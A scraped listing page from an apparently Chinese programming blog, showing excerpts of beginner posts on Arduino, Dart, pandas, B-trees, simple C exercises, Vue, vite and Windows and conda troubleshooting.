//引入依赖 #include &lt;LiquidCrystal.h&gt;//lcd显示屏依赖库文件 #include &lt;IRremote.h&gt;//红外线接收模块依赖库文件 // 初始化针脚 const int rs = 3, en = 4, d4 = 10, d5 = 11, d6 = 12,d7 = 13; LiquidCrystal lcd(rs, en, d4, d5, d6, d7); //红外线接收模块定义 int PIN_RECV = 9; int LED_PIN = 5;//红色小灯 IRrecv irrecv(PIN_RECV); decode_results results; int led=0; // 设定SR04连接的Arduino引脚 const int TrigPin = 7; const int EchoPin = 6; const int LedPin = 2;//蓝色小灯 float distance; void setup() // 初始化 { //设置LCD要显示的列数、行数，即2行16列 lcd.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/caf186845ea163846ef54c2d5896da0f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d76ae011aa21604ce1b720ddf57ca569/" rel="bookmark">
			Flutter中使用的dart语言和Java语言的差异以及相似之处
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：对于学过或者有Android开发经验的同学来说，对于Java 语言可以说是相当的熟悉的了，但对Flutter有兴趣的部分同学而言，想要学习Flutter，是需要先了解Dart语言的语法的，dart语言其实和Java语言是有很大的相似之处的，为了能让大家更快的对dart语言有一个初步的认识，博主在这给Java和dart语言进行一个异同之处的对比。
1.变量 Dart定义变量时可以不预先定义变量类型，程序会自动推断类型，定义变量可以通过 var 关键字来申明变量
eg: var name = 'Dart';
int age = 24;
2.常量 Dart定义常量用 final 和 const 关键字来修饰符
const值不变，一开始就得赋值
final 可以开始不赋值，但只能赋值一次
final 不仅有const的编译时常量的特性，最重要的它是运行时常量，并且final是惰性初始化，即在运行时第一次使用前才初始化
常量是永远不改量的量，用final或const修饰它，而不是使用var或其他变量类型
// const 常量
const PI = 3.14159;
print('PI: $PI');
// final 常量 final PI_2 = 3.1415;
print('final常量 PI_2: $PI_2');
final a = new DateTime.now();
print(a); // 2020-03-05 12:02:05.759293
// const a = new DateTime.now(); // 报错
// final 和 const 区别： // final 可以开始不赋值，但只能赋一次；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d76ae011aa21604ce1b720ddf57ca569/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30b46395025a55dbdf06abf612680a71/" rel="bookmark">
			实现与seekbar随动的textview显示实时进度的实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前几天接到一个需求需要再现在调整音量屏幕亮度时显示实时的数值，比较简单的一个功能，记录一下
刚看到这个需求时，采用了一种办法来实现textview跟随seekbar的thumb随动代码如下。
sb_voice.setOnSeekBarChangeListener(new OnSeekBarChangeListener() { @Override public void onStopTrackingTouch(SeekBar arg0) { } @Override public void onStartTrackingTouch(SeekBar arg0) { } @Override public void onProgressChanged(SeekBar seekbar, int progress, boolean fromUser) { resetViewTime(); mAudioManager.setStreamVolume(AudioManager.STREAM_MUSIC, progress, 0); volumnNumberDisplay.setText(String.valueOf(progress)); float textWidth = volumnNumberDisplay.getWidth(); float seekbatLeft = sb_voice.getLeft(); float seekbarMax = Math.abs(sb_voice.getMax()); final float scale = context.getResources().getDisplayMetrics().density; float thumb = 5*scale + 0.5f; float aveage = (((float)sb_voice.getWidth()) - 2 * thumb) / seekbarMax; float currentProgress = progress; float pox = seekbatLeft - textWidth/2 + thumb + aveage +currentProgress; volumnNumberDisplay.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/30b46395025a55dbdf06abf612680a71/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91866145d3574895f33f7c5bcfa5da06/" rel="bookmark">
			pandas Dataframe减少数据的内存
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		def reduce_mem_usage(df, verbose=True): numerics = ['int16', 'int32', 'int64', 'float16', 'float32', 'float64'] start_mem = df.memory_usage().sum() / 1024**2 for col in df.columns: col_type = df[col].dtypes if col_type in numerics: c_min = df[col].min() c_max = df[col].max() if str(col_type)[:3] == 'int': if c_min &gt; np.iinfo(np.int8).min and c_max &lt; np.iinfo(np.int8).max: df[col] = df[col].astype(np.int8) elif c_min &gt; np.iinfo(np.int16).min and c_max &lt; np.iinfo(np.int16).max: df[col] = df[col].astype(np.int16) elif c_min &gt; np.iinfo(np.int32).min and c_max &lt; np.iinfo(np.int32).max: df[col] = df[col].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91866145d3574895f33f7c5bcfa5da06/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7dc68908ca13ccdbcc6c32cace39faea/" rel="bookmark">
			为什么说B树和B&#43;树的每个节点对应一个磁盘页，IO操作最坏的情况下是树的高度？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先，讲一下什么是索引 索引就好比是书的目录，比如当我们查看一本字典的时候，目录就相当于我们的对照表，
也就是说，目录里的内容来源于书本但却独立于书本，但是呢，目录又是这本书里的一页(●ˇ∀ˇ●)，就酱
然后，讲一下访存的问题 我们都知道，计算机的存储管理是分层的，各层次之间的速度差距比较大，尤其是辅存（磁盘）和主存之间的速度
那么，我们都知道磁盘访问比较慢，为啥会这么慢呢？
首先，cpu访问磁盘时，磁盘主要干了这些事
1. 寻道：磁头摆一摆，找到对应的柱面
2. 定位：盘面转一转，磁头定位到指定扇区
在这两个步骤中，因为是机械操作，我们都晓得，这机械运动哪能比得上人家主存的电信号传播呢(￣_,￣ )，所以自然就慢了不少，磁盘访问慢了，访问效率自然就跟不上了
既然这么慢，那我们肯定就得想办法，能不能在不改变这种机械运动的情况下提升一下这个访存效率呢？
这就好比你查字典，给你一个字，你翻一翻，给你一堆字，你翻n翻，查半年？
能不能有个好一点的目录，一搜搜一篇，命中率嘎嘎的那种？
所以，这就要求我们建立一个好的索引也就是所谓的好目录来帮助我们啦
磁盘读写原理 这里主要介绍一下磁盘预读原理，在这之前，要讲一下预读原理的基础，程序的局部性原理
程序的局部性原理是指程序在执行时呈现出局部性规律，即在一段时间内，整个程序的执行仅限于程序中的某一部分。相应地，执行所访问的存储空间也局限于某个内存区域（也就是说，这个程序在这一小段时间内只会用这一部分内存的这一小撮数据）
磁盘预读： 有了这个局部性原理，那我就想了，这程序执行依次要一个数据，现在我知道它要的数据基本都是一堆一堆的凑在一起的，那我就可以在它要之前我这个磁盘先读着我这个扇区下面的内容，反正我这磁盘转着挺快的，顺序读取效率蛮高，我先读着，你要不要另说(●ˇ∀ˇ●)
通过预读呢，我们就可以提前准备好要用数据，提升I/O效率
那么我们怎么去预读呢，预读多大呢？
预读的长度一般为页（page）的整倍数。页是计算机管理存储器的逻辑块，硬件及操作系统往往将主存和磁盘存储区分割为连续的大小相等的块，每个存储块称为一页（在许多操作系统中，页得大小通常为4k），主存和磁盘以页为单位交换数据。当程序要读取的数据不在主存中时，会触发一个缺页异常，此时系统会向磁盘发出读盘信号，磁盘会找到数据的起始位置并向后连续读取一页或几页载入内存中，然后异常返回，程序继续运行。（抄抄抄(❤ ω ❤)）
B树和B+树 具体结构不说了，大家既然看这篇文章想必是都懂
这两种数据结构其实就是我们要构造的索引所用到的数据类型
在实际设计中，我们把一个结点设为一个页，为什么这么干呢，因为磁盘预读是以页为单位的，所以这样的话一页就代表访问一次磁盘，也就是代表一次I/O操作。
下面我们分别来看一下这两种不同的索引：
B树： 假设有一棵M阶的B树，那么每个结点最多M-1个关键字。我们通过一次磁盘访存就可以访问这个结点，也就是M-1个关键字。一般树的高度不会超过3层，也就是说，查找一个关键码只需要3次磁盘操作就可以了。
注意B树的非叶结点不单单只有key值，还有key对应数据在磁盘的具体地址
B+树： B+树的非叶结点值只有索引，而Ｂ树每个结点中的每个关键字都有卫星数据（也就是具体数据）；这就意味着同样的大小的磁盘页B+树可以容纳更多节点元素，就会显得更加“矮胖”，高度更小，磁盘操作也就相对会更少一些。
同时由于B+树增加了一个最小关键字的根结点，所以顺序访问更加便捷。
总结 数据量很大的查找，是不能直接放入内存的，而是需要什么数据就通过磁盘IO去获得。
红黑树，AVL树等二叉查找树虽然效率高，但是树的高度也大，每次访问结点都需要一次IO；而B树B+树这种多路查找树可以使得树的高度变小。
在最坏的情况下，一次IO就只能获得一个结点的值，所以在最坏的情况下，不管是红黑树还是AVL树、B树、B+树，他们对应的磁盘操作是树的高度。
关于B树和B+树的其他总结： B树和B+树【特征，插入、查询、删除操作，以及区别联系】
参考：https://blog.csdn.net/bengshakalakaka/article/details/89255902
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d699d9f87203ea5e3fe90942b92ab2a/" rel="bookmark">
			C语言  A除以B
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目：给定两个绝对值不超过100的整数A和B，要求你按照“A/B=商”的格式输出结果。
输入格式：
输入在第一行给出两个整数A和B（−100≤A,B≤100），数字间以空格分隔。
输出格式：
在一行中输出结果：如果分母是正数，则输出“A/B=商”；如果分母是负数，则要用括号把分母括起来输出；如果分母为零，则输出的商应为Error。输出的商应保留小数点后2位。
输入样例1：
-1 2
输出样例1：
-1/2=-0.50
输入样例2：
1 -3
输出样例2：
1/(-3)=-0.33
输入样例3：
5 0
输出样例3：
5/0=Error
代码如下：
#include&lt;stdio.h&gt; int main() { float A,B,s; scanf("%f %f",&amp;A,&amp;B); s=A/B; if(B&gt;0) printf("%.0f/%.0f=%.2f",A,B,s); else if(B==0) printf("%.0f/%.0f=Error",A,B); else printf("%.0f/(%.0f)=%.2f",A,B,s); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b64e638fee9be4e0321152713ab12ae0/" rel="bookmark">
			C语言 统计N个数中的奇偶个数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目：给定N个正整数，请统计奇数和偶数各有多少个？
输入格式：
输入第一行给出一个正整N（≤1000）；第2行给出N个非负整数，以空格分隔。
输出格式：
在一行中先后输出奇数的个数、偶数的个数。中间以1个空格分隔。
输入样例：
9
88 74 101 26 15 0 34 22 77
输出样例：
3 6
代码如下：
#include&lt;stdio.h&gt; int main() { int N,a,i,j=0,k=0; scanf("%d",&amp;N); for(i=1;i&lt;=N;i++) { scanf("%d",&amp;a); if(a%2==0){ j++; } else{ k++; }; } printf("%d %d",k,j); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab8f0b1ed0059219444ecc46a93a6fdc/" rel="bookmark">
			C语言入门教程（1） CSDN花神生涯
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 C语言学习过程（1）数据描述计算机是硬件计算机中单位数据类型之基本类型→“原子类型”打印函数标识符 数的表示和进制转换将非十进制转换成十进制将十进制转换成非十进制将二进制数转换成八进制数和十六进制数将八进制数和十六进制数转换成二进制数八进制与十六进制之间的转换 字节和位的概念整数的表示方法—原码，反码，补码常量和变量定义变量的方法变量的分类输入数据→使用输入函数变量的作用域生命周期 C语言学习过程（1） 数据描述 计算机是硬件 正电→1负电→0 计算机中单位 一个字节=8个比特位大小bit 比特位→byte字节→KB→MB→GB→TB→PB 数据类型之基本类型→“原子类型” 整型 int
短整型→short
长整型→long字符数据型char实型
单精度型→float
双精度型→double 枚举类型 注意 c语言没有字符串类型，为什么出现这么多类型？
其原因是：为了更加丰富的表达生活中的各种值
打印函数 %C→打印字符格式%d→打印整型十进制数%f→打印小数%p→以地址形式打印%x→打印十六进制数
… 标识符 只能由字母（A~ Z，a~ z），数字（0~ 9），下划线（_）组成而且第一个字符必须是字母或下划线 数的表示和进制转换 数制：用一组固定的计数符号（称为数符或数码）和一套统一的规则表示数值的方法亦称为’进制“数码：用不同的数字符号来表示一种数制的数值基数：数制所使用的数码个数称为“基数”，例如：十进制基数为10.二进制基数为2位权：某数制中每一位所具有的权重称为“位权”，亦称“权”，位权的值是基数的若干次幂，例如：十进制数256.8中，2的位权为10^ 2; 5的位权10^1,6的位权10的0次，8的位权为10的-1次 将非十进制转换成十进制 将非十进制按权位展开，然后各项相加 二进制数N=（10110.101）转换为十进制数是：
N=1X2^ 4+0X2^ 3+1X2^ 2+1X2^ 1+ 0X2^ 0+1X2^ -1+1X2^ -1+ 0X2^ -2+ 0X2^ -3
==16+4+2+0.5+0.125=22.625
将十进制转换成非十进制 对整数部分和小数部分分别采取不同的方法进行转换读数顺序：最高位往最低位读 整数部分：
十进制数除以进制数，余数为最低位
商数继续除以进制数，余数接着排列
……
商为0，这时的余数为最高位、
小数部分
十进制的小数部分 X 进制数（一次只能乘一次），取整数部分为最高位
取上一步骤小数部分（不包括上面整数部分） X 进制数，取整数接着排列
……
直到着一步骤小数部分为0，取整数部分为最低位
将二进制数转换成八进制数和十六进制数 三对一的压缩，从左往右划分，按每三位分为一组（整数位不够补0）。然后转换为八进制数
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab8f0b1ed0059219444ecc46a93a6fdc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2cd81ff000836b44cb647259cc98def6/" rel="bookmark">
			beforeDestroy没有效果、beforeDestroy没有运行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		beforeDestroy没有效果、beforeDestroy没有运行 最近在使用vue ui创建了一个vue3的项目，vue/cli的版本是4.5.6
发现beforeDestroy没有效果、beforeDestroy没有运行，百度半天都是说keep-alive修饰的路由导致的，但是我项目里面根本就没有使用这个。
最后发现是因为beforeDestroy已经被beforeUnmount替换了。
你运行项目的时候，在浏览器控制台也可以发现vue warn 警告说beforeDestroy已经被beforeUnmount替换了，换了试了一下，运行了，果然如此。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef975cbe226af4f7cb2111ef62d3b1a0/" rel="bookmark">
			unity获取委托所绑定的所有事件并清除
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考：https://www.cnblogs.com/fangxiao/archive/2011/08/11/2134623.html class Class1 { #region 帮助委托 /// &lt;summary&gt; /// 移除所有注册事件 移除类 的名为eventname 的委托 /// &lt;/summary&gt; public static void RemoveAllEvent(object _class, string eventname) { var newType = _class.GetType(); foreach (var item in newType.GetEvents()) { if (eventname == item.Name) { GameLogger.Logger.Info($"RemoveAllEvent : EventName={item.Name}"); FieldInfo _Field = newType.GetField(item.Name, BindingFlags.Instance | BindingFlags.NonPublic); if (_Field != null) { object _FieldValue = _Field.GetValue(_class); if (_FieldValue != null &amp;&amp; _FieldValue is Delegate) { Delegate _ObjectDelegate = (Delegate)_FieldValue; Delegate[] invokeList = _ObjectDelegate.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ef975cbe226af4f7cb2111ef62d3b1a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20fded9bbda9dd8eeca2a334194e835f/" rel="bookmark">
			如何用Graphpad Prism 8作散点图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Prism有几种方式来制作一个图表，这个图表里的一个数据表的每个数据点都单独显示在一个图表里。虽然由这个方法制作出来的图表看上去很相似，但是他们其实是相当不同的。选择正确的数据表格式是非常重要的一步。什么是绘制一个散点图或显示平均值和误差的图的最好方法？
1、XY散点图
在一个XY数据表里，每个数据组的每个x值都有几个重复值。当你制作你的图表时，你能选择将所有的重复值都显示在你的图表上，而不是显示在误差棒里。如果你想显示每一个x值的重复值，则使用一个XY表。prism（win mac 8.4 下载）
如果想格式化一个XY图，以在上图里显示每一个数据点，点击工具条里“Format Graph"按钮，选择“all to Choose all data sets"，然后选择“show each replicate"。如果要显示平均值和误差，则在下拉的菜单里选择"Mean and Error"。
2、柱状散点图
​​​​​​​剩余类容查看
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b1cce2ea901429910f706928453f44c/" rel="bookmark">
			独热编码（One-Hot Encoding）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载自：https://www.cnblogs.com/zongfa/p/9305657.html
在很多机器学习任务中，特征并不总是连续值，而有可能是分类值。
离散特征的编码分为两种情况：
1.离散特征的取值之间没有大小的意义，比如color：[red,blue],那么就使用one-hot编码
2.离散特征的取值有大小的意义，比如size:[X,XL,XXL],那么就使用数值的映射{X:1,XL:2,XXL:3}
例如，考虑一下的三个特征：
["male", "female"] ["from Europe", "from US", "from Asia"] ["uses Firefox", "uses Chrome", "uses Safari", "uses Internet Explorer"] 如果将上述特征用数字表示，效率会高很多。例如：
["male", "from US", "uses Internet Explorer"] 表示为[0, 1, 3] ["female", "from Asia", "uses Chrome"]表示为[1, 2, 1] 但是，即使转化为数字表示后，上述数据也不能直接用在我们的分类器中。因为，分类器往往默认数据数据是连续的（可以计算距离？），并且是有序的（而上面这个0并不是说比1要高级）。但是，按照我们上述的表示，数字并不是有序的，而是随机分配的。
独热编码 为了解决上述问题，其中一种可能的解决方法是采用独热编码（One-Hot Encoding）。独热编码即 One-Hot 编码，又称一位有效编码，其方法是使用N位状态寄存器来对N个状态进行编码，每个状态都由他独立的寄存器位，并且在任意时候，其中只有一位有效。
例如：
自然状态码为：000,001,010,011,100,101 独热编码为：000001,000010,000100,001000,010000,100000 可以这样理解，对于每一个特征，如果它有m个可能值，那么经过独热编码后，就变成了m个二元特征（如成绩这个特征有好，中，差变成one-hot就是100, 010, 001）。并且，这些特征互斥，每次只有一个激活。因此，数据会变成稀疏的。
该文转载自：https://www.cnblogs.com/zongfa/p/9305657.html
这样做的好处主要有：
1）解决了分类器不好处理属性数据的问题；
2）在一定程度上也起到了扩充特征的作用；
为什么要独热编码？ 正如上文所言，独热编码（哑变量 dummy variable）是因为大部分算法是基于向量空间中的度量来进行计算的，为了使非偏序关系的变量取值不具有偏序性，并且到圆点是等距的。使用one-hot编码，将离散特征的取值扩展到了欧式空间，离散特征的某个取值就对应欧式空间的某个点。将离散型特征使用one-hot编码，会让特征之间的距离计算更加合理。离散特征进行one-hot编码后，编码后的特征，其实每一维度的特征都可以看做是连续的特征。就可以跟对连续型特征的归一化方法一样，对每一维特征进行归一化。比如归一化到[-1,1]或归一化到均值为0,方差为1。 为什么特征向量要映射到欧式空间？
将离散特征通过one-hot编码映射到欧式空间，是因为，在回归，分类，聚类等机器学习算法中，特征之间距离的计算或相似度的计算是非常重要的，而我们常用的距离或相似度的计算都是在欧式空间的相似度计算，计算余弦相似性，基于的就是欧式空间。
独热编码优缺点 优点：独热编码解决了分类器不好处理属性数据的问题，在一定程度上也起到了扩充特征的作用。它的值只有0和1，不同的类型存储在垂直的空间。
缺点：当类别的数量很多时，特征空间会变得非常大。在这种情况下，一般可以用PCA来减少维度。而且one hot encoding+PCA这种组合在实际中也非常有用。
什么情况下(不)用独热编码 用：独热编码用来解决类别型数据的离散值问题；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2b1cce2ea901429910f706928453f44c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2e6899c99bee44741a387fe473e1645/" rel="bookmark">
			苹果一体机装win10系统无声音
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题没解决肯定很着急，问题后面分析，先说解决办法！！！
按照上图所示，先找到服务（win+R打开运行，输入services.msc打开服务），
找到Windows Audio服务——右键属性——登陆——选择此账户——手动输入：“本地账户”——密码和确认密码随便输入123456——确认后重启动此服务就好了。
我的故障是这样解决的，因情况而异，不要只是学会方法，要学会解决问题的思路
故障：苹果一体机装的win10系统，装好后播放不出声音。
分析问题：音频设备选择不对或设置有问题、驱动问题、硬件问题
解决问题：刚装好后没声音用“疑难解答”查到音频服务未启动，打开服务重启了音频服务无用，然后重新装驱动无用，硬件是好的（重做系统前是有声音的）。改用蓝牙耳机测试了下，还是无用，思考驱动应该是没问题的，音频设备设置一切正常，疑难解答报的一直是音频服务未启动，怀疑还是服务那里出了问题。
打开Windows Audio服务，可选项不多，一个是设为自动启动，一个是登陆项。
自动启动是默认的不说，登陆项有本地系统账户，有此账户，我在此账户点浏览——高级——查找，找到我的账户（例：“风过无痕”）点确定，然后设置密码，重启服务后发现仍然无用。又重新把设置、驱动、服务啥的试了几遍，无计可施之时发现其他的服务的“登陆为”只有两种，一种是本地系统，另一种是本地服务。然后我把Windows Audio服务登陆项手动输入本地服务，然后设置密码123456，成功了。。重启，隔几天在试，仍然是好的。OK。故障点就是在服务登陆项里，应该设成登陆为本地服务。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ff7d3e72aae992e4d5a202c38741c9e/" rel="bookmark">
			HDU-5955 Guessing the Dice Roll（AC自动机、高斯消元）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 原题链接题意思路推导代码 原题链接 Guessing the Dice Roll
题意 给定 N ( 1 ≤ N ≤ 10 ) N(1 \leq N \leq 10) N(1≤N≤10) 个长度都为 L ( 1 ≤ L ≤ 10 ) L(1 \leq L \leq 10) L(1≤L≤10) 的数字序列 T i ( 1 ≤ i ≤ 10 ) T_i(1 \leq i \leq 10) Ti​(1≤i≤10)，数字序列仅由 { 1 , 2 , 3 , 4 , 5 , 6 } \left\{1,2,3,4,5,6\right\} {1,2,3,4,5,6} 组成。设一开始数字序列 S S S 为空，每轮进行如下操作：从 { 1 , 2 , 3 , 4 , 5 , 6 } \left\{1,2,3,4,5,6\right\} {1,2,3,4,5,6} 中等概率的选择一个数字，加在序列 S S S 的末尾，如果 N N N 条序列中存在一条序列与 S S S 的后缀匹配，则结束。问 N N N 条序列中，每条序列被匹配的概率。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ff7d3e72aae992e4d5a202c38741c9e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e99c8456086fb2bd8c820a2602b8efb/" rel="bookmark">
			前端开发新工具-vite
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vite 是什么
vite——一个由 vue 作者尤雨溪专门为 vue 打造的开发利器，其目的是使 vue 项目的开发更加简单和快速。
vite 究竟有什么作用？用 vite 文档上的介绍，它具有以下特点：
快速的冷启动 即时的热模块更新 真正的按需编译 以上三个优点，社区也早有对应的解决方案，比如快速的冷启动可以借助各种 cli ：vue-cli、create-react-app 等等，热更新就更不用说了，不过按需编译需要开发者自行在代码中使用 impor(‘xx.js’) 实现， 那么 vite 有什么特别的地方呢？用作者在微博上的原话：
Vite，一个基于浏览器原生 ES imports 的开发服务器。利用浏览器去解析 imports，在服务器端按需编译返回，完全跳过了打包这个概念，服务器随起随用。同时不仅有 Vue 文件支持，还搞定了热更新，而且热更新的速度不会随着模块增多而变慢。针对生产环境则可以把同一份代码用 rollup 打。虽然现在还比较粗糙，但这个方向我觉得是有潜力的，做得好可以彻底解决改一行代码等半天热更新的问题。[ ]()
可以看到 vite 主要特色是基于浏览器原生的 ES Module 来开发，从而实现按需编译，也就没有打包这个概念——因为需要什么资源直接在浏览器里引入即可，不过基于浏览器原生 ES module 来开发 web 应用也不是什么新鲜事，snowpack 也是做这个事情，而且它可以用在所有项目上，不过目前此项目社区中没有流行的使用起来，好在 vue 在 web 开发领域有着极大的话语权，vite 的出现可以说又会让利用 ES module 开发火一阵子。
有趣的是 vite 算是革了 webpack 的命了（生产环境用 rollup），所以 webpack 的开发者直接喊大哥了…
image.png
vite 的使用方式
同其他开发工具一样，vite 提供了用 npm 或者 yarn 一建生成项目的途径，使用 yarn 在终端执行：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e99c8456086fb2bd8c820a2602b8efb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2138b954b96bc03a7d91e8a11c393856/" rel="bookmark">
			基于win10 和python3.6激活虚拟环境成功！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		试了很多种方法，比如下面这种
virtualenv envname # 创建名为envname的虚拟环境 source bin/activate # 老是报错：source不是内部或外部命令 后面参考了 这种方法在Windows命令行中运行以下命令以激活虚拟环境
正文 5. 此时查看安装的环境里还没有tf15 再输入 conda create -n tf15 python=3.6 和y ,
或者 conda create --name tf15 python=3.6 。 才开始
安装时出现 HTTP error , 试过更改镜像， 把.condarc文件里的镜像去掉default, 或者 关闭 ssl_verify ： conda config --set ssl_verify false（没用哎） 都没用啊！！
试了之后还是报错
问题 2：Collecting package metadata (repodata.json): failed CondaHTTPError: HTTP 000 CONNECTION FAILED for repodata.json&gt; 参考 https://blog.csdn.net/weixin_44607531/article/details/105186364 ，总蒜是这个下载[OpenSSL]成功啦
安装 tf 1.13虚拟环境 conda create --name tf113 python=3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2138b954b96bc03a7d91e8a11c393856/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/baaf0054395989f0b501afd56baf3369/" rel="bookmark">
			C语言 计算指数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目： 对任意给定的不超过 10 的正整数 n，输出 2^n ​​。
输入格式：
输入在一行中给出一个不超过 10 的正整数 n。
输出格式：
在一行中按照格式 2^n = 计算结果 输出2^n ​​的值。
输入样例：
5
输出样例：
2^5 = 32
这题用到pow函数，用法
例如：求 x^n 时，pow(x,n);
代码如下：
#include&lt;stdio.h&gt; #include&lt;math.h&gt; int main() { int n,a,b; scanf("%d",&amp;n); a=pow(2,n); printf("2^%d = %d",n,a); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7889ed4b9adb3bac67612b3bf23e6f94/" rel="bookmark">
			C语言 三个数字比较大小
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目：要求将输入的任意3个整数从小到大输出。
输入格式:
输入在一行中给出3个整数，其间以空格分隔。
输出格式:
在一行中将3个整数从小到大输出，其间以“-&gt;”相连。
输入样例:
4 2 8
输出样例:
2-&gt;4-&gt;8
代码如下：
#include&lt;stdio.h&gt; int main() { int a,b,c,x,y; scanf("%d %d %d",&amp;a,&amp;b,&amp;c); if(a&gt;b); else if(b&gt;a) x=b,y=a,a=x,b=y; if(a&gt;c) x=a,y=c,a=x,c=y; else if(a&lt;c) x=c,y=a,a=x,c=y; if(b&gt;c) x=b,y=c,b=x,c=y; else if(b&lt;c) x=c,y=b,b=x,c=y; printf("%d-&gt;%d-&gt;%d",c,b,a); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1b6c246980978aeee4eee0e5e91998c/" rel="bookmark">
			C语言 念数字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目：输入一个整数，输出每个数字对应的拼音。当整数为负数时，先输出fu字。十个数字对应的拼音如下：
输入格式：
输入在一行中给出一个整数，
如：1234。
提示：整数包括负数、零和正数。
输出格式：
在一行中输出这个整数对应的拼音，每个数字的拼音之间用空格分开，行末没有最后的空格。
如：yi er san si。
代码如下：
#include&lt;stdio.h&gt; int main() { char c; c=getchar(); while(c!='\n') { if(c=='-') printf("fu"); else if(c=='0') printf("ling"); else if(c=='1') printf("yi"); else if(c=='2') printf("er"); else if(c=='3') printf("san"); else if(c=='4') printf("si"); else if(c=='5') printf("wu"); else if(c=='6') printf("liu"); else if(c=='7') printf("qi"); else if(c=='8') printf("ba"); else if(c=='9') printf("jiu"); c=getchar(); if(c!='\n') printf(" "); } return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9a01ebd6c4bd2c7b14f9887ba14274f/" rel="bookmark">
			C语言 计算摄氏温度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目：给定一个华氏温度F，本题要求编写程序，计算对应的摄氏温度C。
摄氏温度C的计算公式为：C=5×(F−32)/9。
题目保证输入与输出均在整型范围内。
输入格式:
输入在一行中给出一个华氏温度。
输出格式:
在一行中按照格式“Celsius = C”输出对应的摄氏温度C的整数值。
代码如下：
#include&lt;stdio.h&gt; int main() { int F,C; scanf("%d",&amp;F); C=5.0/9*(F-32); //注意如果是 5 的话可能会计算错误 printf("Celsius = %d",C); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25c87162c9ef1a2315b9bcc57f9a9cd8/" rel="bookmark">
			sudo apt-get update 出现 “无法安全地用该源进行更新，所以默认禁用该源”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述 sudo apt-get update 今天在运行上述命令时报错：
